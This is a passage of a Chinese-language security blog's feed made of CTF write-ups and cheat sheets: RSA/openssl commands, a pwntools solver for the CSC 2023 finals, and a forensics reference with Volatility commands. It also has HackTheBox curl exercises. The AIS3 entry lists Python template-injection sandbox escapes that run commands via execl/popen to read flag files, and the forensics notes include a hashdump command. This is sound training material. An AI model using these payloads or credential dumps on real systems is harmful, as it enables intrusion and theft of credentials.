&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; d &lt;span style="color:#f92672">=&lt;/span> 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; p &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; q &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key_params &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>n, e, d, p, q&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key &lt;span style="color:#f92672">=&lt;/span> RSA.construct&lt;span style="color:#f92672">(&lt;/span>key_params&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f &lt;span style="color:#f92672">=&lt;/span> open&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;./rsaprivatekey.pem&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.write&lt;span style="color:#f92672">(&lt;/span>key.exportKey&lt;span style="color:#f92672">()&lt;/span>.decode&lt;span style="color:#f92672">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.close&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - RSA(很清楚)&lt;/a>
:::spoiler Cheat Sheet
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">&amp;#39;&amp;#39;&amp;#39;AES / DES&amp;#39;&amp;#39;&amp;#39;
$ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt)
$ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt)
$ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt)
$ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt)

&amp;#39;&amp;#39;&amp;#39;RSA&amp;#39;&amp;#39;&amp;#39;
$ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024
# (generate RSA private key)
$ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out
rsa_publickey.pem (generate RSA public key)
$ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt
# (use public key to encrpt)
$ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt

# To print out the components of a private key to standard output
$ openssl rsa -in key.pem -text -noout

# 把certificate轉成pem file
$ openssl openssl x509 -in cert -pubkey -noout
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

# 把單純public key的內容(n, e)(就是上面的東西)印出來
$ openssl rsa -pubin -in public.pem -text
RSA Public-Key: (53 bit)
Modulus: 4966306421059967 (0x11a4d45212b17f)
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

// 產出私鑰
openssl genrsa -out key.pem 2048

// 用同一把私鑰，產出兩組不同的憑證
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30

// 顯示公鑰是一樣
openssl x509 -pubkey -noout -in cert1.pem
openssl x509 -pubkey -noout -in cert2.pem

// 顯示憑證內容是不一樣
openssl x509 -inform pem -in cert2.pem
openssl x509 -inform pem -in cert1.pem
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="factoring-tools">
 Factoring Tools
 &lt;a class="anchor" href="#factoring-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://factordb.com/index.php">Factor DB&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/DarkenCode/yafu">Yafu&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.alpertron.com/ECM.HTM">Prime Factorization Online&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>CSC 2023 決賽</title><link>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</guid><description>&lt;h1 id="csc-ctf-2023-決賽">
 CSC CTF 2023 決賽
 &lt;a class="anchor" href="#csc-ctf-2023-%e6%b1%ba%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;p>隊伍名稱: 名字好難想RRRRRRRRRRRRRRR&lt;/p>
&lt;h2 id="教學題">
 教學題
 &lt;a class="anchor" href="#%e6%95%99%e5%ad%b8%e9%a1%8c">#&lt;/a>
&lt;/h2>
&lt;h3 id="q4">
 Q4
 &lt;a class="anchor" href="#q4">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>成為「admin」並取得Flag&lt;/p>
&lt;p>[連線IP/連結資訊]
http://192.168.100.71&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h4>
&lt;p>這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄
學長自述:&lt;/p>
&lt;h3 id="q5">
 Q5
 &lt;a class="anchor" href="#q5">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述-1">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-1">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h4>
&lt;p>測驗智商用的，直接pwntools就可以了&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from pwn import *

r = process(&amp;#39;./Bomb.exe&amp;#39;)
r.recvuntil(b&amp;#39;P1ease count A(&amp;#39;)
A = r.recvuntil(b&amp;#39;)&amp;#39;)[:-1].decode()
sign = r.recv(3).decode()
B = r.recvline()[2:-2].decode()

log.info(f&amp;#39;A({A}) {sign} B({B}) = {eval(A + sign + B)}&amp;#39;)
r.sendlineafter(b&amp;#39;Enter your answer: &amp;#39;, str(eval(A + sign + B)).encode())

r.interactive()
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py
[+] Starting local process &amp;#39;./Bomb.exe&amp;#39;: pid 8143
[*] A(1507886) + B(7372399) = 8880285
[*] Switching to interactive mode

Good job!\(^^)/
CSC{FLAG_54v3th3d4y7777777}Time&amp;#39;s up! (っ•O•)╮ =͟͟͞͞●~*
[*] Got EOF while reading in interactive
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>CSC{FLAG_54v3th3d4y7777777}&lt;/code>&lt;/p></description></item><item><title>DEADFACE CTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</guid><description>&lt;h1 id="deadface-ctf-2023">
 DEADFACE CTF 2023
 &lt;a class="anchor" href="#deadface-ctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler 比賽成果
&lt;img src="https://hackmd.io/_uploads/BkhuIH1QT.png" alt="" />
:::&lt;/p>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;h3 id="youve-been-ransomwared">
 You&amp;rsquo;ve Been Ransomwared
 &lt;a class="anchor" href="#youve-been-ransomwared">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>DEADFACE is taunting GlitterCo with their latest ransomware attack. According to our intel, the attackers like to leave a calling card in their attacks. If we can figure out which DEADFACE actor executed this attack, we might be able to figure out a way around paying. Can you find anything in this screenshot that might point to which attacker ran this ransomware attack?&lt;/p></description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</guid><description>&lt;h1 id="eof-ais3-final">
 EOF AIS3 Final
 &lt;a class="anchor" href="#eof-ais3-final">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-ais3">
 tags: &lt;code>CTF&lt;/code> &lt;code>AIS3&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-ais3">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/">https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html">https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md">https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md&lt;/a>&lt;/p>
&lt;p>SSTI: &lt;a href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html&lt;/a>
&lt;a href="https://www.compart.com/en/unicode/U&amp;#43;FF5B">https://www.compart.com/en/unicode/U+FF5B&lt;/a>
&lt;a href="https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection">https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection&lt;/a>&lt;/p>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;))

file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))

file = &amp;#39;FLAG.TXT&amp;#39;
command = &amp;#39;EXECL&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))


file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))
&lt;/code>&lt;/pre>&lt;h2 id="script---run_scriptpy">
 Script - run_script.py
 &lt;a class="anchor" href="#script---run_scriptpy">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
 subprocess.call([&amp;#39;python&amp;#39;, &amp;#39;script.py&amp;#39;, &amp;#39;--team&amp;#39;, str(i)])

if __name__ == &amp;#34;__main__&amp;#34;:
 p1 = mp.Process(target=cycle, args=(&amp;#39;1&amp;#39;,))
 p2 = mp.Process(target=cycle, args=(&amp;#39;2&amp;#39;,))
 # p3 = mp.Process(target=cycle, args=(&amp;#39;3&amp;#39;,))
 # p4 = mp.Process(target=cycle, args=(&amp;#39;4&amp;#39;,))
 # p5 = mp.Process(target=cycle, args=(&amp;#39;5&amp;#39;,))
 # p7 = mp.Process(target=cycle, args=(&amp;#39;7&amp;#39;,))
 # p8 = mp.Process(target=cycle, args=(&amp;#39;8&amp;#39;,))
 # p9 = mp.Process(target=cycle, args=(&amp;#39;9&amp;#39;,))
 # p10 = mp.Process(target=cycle, args=(&amp;#39;10&amp;#39;,))
 # p11 = mp.Process(target=cycle, args=(&amp;#39;11&amp;#39;,))
 # p12 = mp.Process(target=cycle, args=(&amp;#39;12&amp;#39;,))
 # p13 = mp.Process(target=cycle, args=(&amp;#39;13&amp;#39;,))
 # p14 = mp.Process(target=cycle, args=(&amp;#39;14&amp;#39;,))
 # p15 = mp.Process(target=cycle, args=(&amp;#39;15&amp;#39;,))
 # p16 = mp.Process(target=cycle, args=(&amp;#39;16&amp;#39;,))
 # p17 = mp.Process(target=cycle, args=(&amp;#39;17&amp;#39;,))
 # p18 = mp.Process(target=cycle, args=(&amp;#39;18&amp;#39;,))
 # p19 = mp.Process(target=cycle, args=(&amp;#39;19&amp;#39;,))
 # p20 = mp.Process(target=cycle, args=(&amp;#39;20&amp;#39;,))
 # p21 = mp.Process(target=cycle, args=(&amp;#39;21&amp;#39;,))
 # p22 = mp.Process(target=cycle, args=(&amp;#39;22&amp;#39;,))
 # p23 = mp.Process(target=cycle, args=(&amp;#39;23&amp;#39;,))
 # p24 = mp.Process(target=cycle, args=(&amp;#39;24&amp;#39;,))
 

 p1.start()
 time.sleep(2)
 p2.start()
 time.sleep(2)
 # p3.start()
 # p4.start()
 # p5.start()
 # p7.start()
 # p8.start()
 # p9.start()
 # p10.start()
 # p11.start()
 # p12.start()
 # p13.start()
 # p14.start()
 # p15.start()
 # p16.start()
 # p17.start()
 # p18.start()
 # p19.start()
 # p20.start()
 # p21.start()
 # p22.start()
 # p23.start()
 # p24.start()

 p1.join()
 p2.join()
 # p3.join()
 # p4.join()
 # p5.join()
 # p7.join()
 # p8.join()
 # p9.join()
 # p10.join()
 # p11.join()
 # p12.join()
 # p13.join()
 # p14.join()
 # p15.join()
 # p16.join()
 # p17.join()
 # p18.join()
 # p19.join()
 # p20.join()
 # p21.join()
 # p22.join()
 # p23.join()
 # p24.join()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Forensics Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</guid><description>&lt;h1 id="forensics-cheat-sheet">
 Forensics Cheat Sheet
 &lt;a class="anchor" href="#forensics-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="windows">
 Windows
 &lt;a class="anchor" href="#windows">#&lt;/a>
&lt;/h2>
&lt;h3 id="where">
 Where
 &lt;a class="anchor" href="#where">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>SOFTWARE: &lt;code>root/Windows/System32/config/SOFTWARE&lt;/code>&lt;/li>
&lt;li>SYSTEM: &lt;code>root/Windows/System32/config/SYSTEM&lt;/code>&lt;/li>
&lt;li>NTUSER.DAT: &lt;code>root/Users/{username}/NTUSER.DAT&lt;/code>&lt;/li>
&lt;li>$MFT: &lt;code>root/$MFT&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="software-information">
 SOFTWARE Information
 &lt;a class="anchor" href="#software-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>原本電腦OS的基本資訊(Build Number/Product Name/):
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion&lt;/code>&lt;/li>
&lt;li>檢查SID:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList&lt;/code>&lt;/li>
&lt;li>查看登入:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon&lt;/code>&lt;/li>
&lt;li>StartUp Run:
&lt;code>SOFTWARE/Microsoft/Windows/CurrentVersion/Run&lt;/code>&lt;/li>
&lt;/ul>
&lt;h4 id="ntuserdat每個使用者都不一樣">
 NTUSER.DAT(每個使用者都不一樣)
 &lt;a class="anchor" href="#ntuserdat%e6%af%8f%e5%80%8b%e4%bd%bf%e7%94%a8%e8%80%85%e9%83%bd%e4%b8%8d%e4%b8%80%e6%a8%a3">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>UserAssit:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist&lt;/code>&lt;/li>
&lt;li>Recent Docs:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="system-information">
 System Information
 &lt;a class="anchor" href="#system-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>電腦名稱:
&lt;code>SYSTEM/ControlSet001/Control/ComputerName/ComputerName&lt;/code>&lt;/li>
&lt;li>電腦IP/DHCP相關資訊:
&lt;code>SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/&lt;/code>&lt;/li>
&lt;li>時區:
&lt;code>SYSTEM/ControlSet001/Control/TimeZoneInformation&lt;/code>&lt;/li>
&lt;li>USB資訊:
&lt;code>SYSTEM/ControlSet001/Enum/USBSTOR/&lt;/code>&lt;/li>
&lt;li>CPU架構:
&lt;code>SYSTEM/ControlSet001/Control/Session Manager/Environment/&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database">
 Database
 &lt;a class="anchor" href="#database">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Chrome History:
&lt;code>./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History&lt;/code>&lt;/li>
&lt;li>Firefox History:
&lt;code>./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite&lt;/code>&lt;/li>
&lt;li>Skype Chat History:
&lt;code>./Users/{username}/AppData/Roaming/Skype/{account name}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="taskbar">
 Taskbar
 &lt;a class="anchor" href="#taskbar">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;code>./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="mac-os">
 mac-OS
 &lt;a class="anchor" href="#mac-os">#&lt;/a>
&lt;/h2>
&lt;h3 id="plist">
 plist
 &lt;a class="anchor" href="#plist">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install libplist-utils -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ plistutil -i &lt;span style="color:#f92672">{&lt;/span>plist file&lt;span style="color:#f92672">}&lt;/span> -o &lt;span style="color:#f92672">{&lt;/span>output file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>System Version:
&lt;code>./root/System/Library/CoreServices/SystemVersion.plist&lt;/code>&lt;/li>
&lt;li>Browser Bookmark
&lt;code>./root/Users/{username}/Library/Safari/Bookmarks.plist&lt;/code>&lt;/li>
&lt;li>Password information
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/{username}.plist&lt;/code>&lt;/li>
&lt;li>The process responsible for connecting iPhones/iPads with MacOS is lockdown
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist&lt;/code>&lt;/li>
&lt;li>Spotlight(這個不需要透過plistutil就可以直接cat)
&lt;code>./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="event-log">
 Event Log
 &lt;a class="anchor" href="#event-log">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>短期檔案系統變更儲存在&lt;code>.fseventsd&lt;/code>中，必須使用&lt;code>mac_apt&lt;/code>這個工具幫忙parse(FSEVENTS)
&lt;code>./root/.fseventsd/&lt;/code>&lt;/li>
&lt;li>ScreenTime: 一樣要透過&lt;code>mac_apt&lt;/code>幫忙parse(SCREENTIME)，記得要把&lt;code>RMAdminStore-Local.sqlite-wal&lt;/code>這個檔案和&lt;code>RMAdminStore-Local.sqlite&lt;/code>放在一起執行
&lt;code>./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database-1">
 Database
 &lt;a class="anchor" href="#database-1">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Note
&lt;code>./root/Users/{username}/Library/Group Containers/group.com.apple.notes&lt;/code>&lt;/li>
&lt;li>Quarantined Events
&lt;code>./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2&lt;/code>&lt;/li>
&lt;li>Messages
&lt;code>./root/Users/{username}/Library/Messages/chat.db&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="volatilitys">
 Volatilitys
 &lt;a class="anchor" href="#volatilitys">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">主要的CheatSheet&lt;/a>&lt;/li>
&lt;li>ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid}&lt;/code>&lt;/li>
&lt;li>如果要dump被injected過的process:
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder}&lt;/code>&lt;/li>
&lt;li>dump hash
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump &amp;gt; ntlm.hash&lt;/code>&lt;/li>
&lt;li>如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner &lt;/code>&lt;/li>
&lt;li>查看網路連線紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan&lt;/code>&lt;/li>
&lt;li>在memory中用yarascan去search不同的pattern
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y &amp;quot;example strings&amp;quot;&lt;/code>&lt;/li>
&lt;li>console中的command紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles&lt;/code>&lt;/li>
&lt;li>查看iexplorer的紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>HackTheBox</title><link>https://bernie6401.github.io/docs/security/practice/hackthebox/hackthebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/hackthebox/hackthebox/</guid><description>&lt;h1 id="hackthebox">
 HackTheBox
 &lt;a class="anchor" href="#hackthebox">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="web-requests-get">
 &lt;a href="https://academy.hackthebox.com/module/35/section/247">Web Requests-GET&lt;/a>
 &lt;a class="anchor" href="#web-requests-get">#&lt;/a>
&lt;/h2>
&lt;h3 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h3>
&lt;p>cURL - GET/Header&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl &lt;span style="color:#e6db74">&amp;#39;http://144.126.206.249:31846/search.php?search=flag&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;Authorization: Basic YWRtaW46YWRtaW4=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag: HTB&lt;span style="color:#f92672">{&lt;/span>curl_g3773r&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="web-requests-post">
 &lt;a href="https://academy.hackthebox.com/module/35/section/224">Web Requests-POST&lt;/a>
 &lt;a class="anchor" href="#web-requests-post">#&lt;/a>
&lt;/h2>
&lt;h3 id="background-1">
 Background
 &lt;a class="anchor" href="#background-1">#&lt;/a>
&lt;/h3>
&lt;p>cURL - POST/Cookie/Json Data/Header&lt;/p>
&lt;h3 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h3>
